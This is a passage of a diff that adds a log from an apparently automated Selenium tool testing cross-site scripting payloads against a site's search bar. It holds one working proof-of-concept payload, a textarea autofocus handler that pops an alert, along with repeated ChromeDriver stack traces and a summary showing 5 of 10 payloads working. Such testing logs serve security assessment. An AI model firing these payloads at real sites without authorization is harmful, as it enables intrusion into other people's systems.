+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
+	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
+	RtlUserThreadStart [0x0x7ffea749c34c+44]
+
+2025-06-28 05:20:37,950 - INFO - Payload <textarea onfocus=alert(1) autofocus><![CDATA[alert(1) triggered alert in search_bar after WebDriverException: 1
+2025-06-28 05:20:37,954 - ERROR - WebDriver error for payload <textarea onfocus=alert(1) autofocus><![CDATA[alert(1) on retry 3: Alert Text: 1
+Message: unexpected alert open: {Alert text : 1}
+  (Session info: chrome=138.0.7204.49)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff78684a939]
+	(No symbol) [0x0x7ff78685178a]
+	(No symbol) [0x0x7ff78682608d]
+	(No symbol) [0x0x7ff786849e11]
+	(No symbol) [0x0x7ff7868e0535]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
+	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
+	RtlUserThreadStart [0x0x7ffea749c34c+44]
+
+2025-06-28 05:20:37,954 - ERROR - Max retries reached for payload <textarea onfocus=alert(1) autofocus><![CDATA[alert(1)
+2025-06-28 05:20:37,957 - INFO - Results saved to data/auto_test_results.csv
+2025-06-28 05:20:37,957 - INFO - Working payloads appended to data/mshield_working_xss.txt
+2025-06-28 05:20:37,958 - INFO - Failed payloads appended to data/mshield_failed_xss.txt
+2025-06-28 05:20:37,959 - INFO - Error payloads appended to data/mshield_error_xss.txt
+2025-06-28 05:20:37,964 - INFO - Handled alert with text: 1
+2025-06-28 05:20:38,467 - WARNING - Error handling alert: Alert Text: 1
+Message: unexpected alert open: {Alert text : 1}
+  (Session info: chrome=138.0.7204.49)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff7868e110c]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
+	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
+	RtlUserThreadStart [0x0x7ffea749c34c+44]
+
+2025-06-28 05:20:38,476 - WARNING - Failed to reset page state: Alert Text: 1
+Message: unexpected alert open: {Alert text : 1}
+  (Session info: chrome=138.0.7204.49)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff78684a939]
+	(No symbol) [0x0x7ff78685178a]
+	(No symbol) [0x0x7ff78682608d]
+	(No symbol) [0x0x7ff786849e11]
+	(No symbol) [0x0x7ff7868e0535]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
+	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
+	RtlUserThreadStart [0x0x7ffea749c34c+44]
+
+2025-06-28 05:20:38,479 - ERROR - Error during payload testing: Alert Text: 1
+Message: unexpected alert open: {Alert text : 1}
+  (Session info: chrome=138.0.7204.49)
+Stacktrace:
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff7868e110c]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
+	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
+	RtlUserThreadStart [0x0x7ffea749c34c+44]
+
+2025-06-28 05:20:38,479 - INFO - Continuing with remaining 19 payloads
+2025-06-28 05:20:40,936 - INFO - WebDriver closed
+2025-06-28 05:20:40,936 - INFO - Tested 10 search_bar payloads: 5 working, 4 failed, 1 error
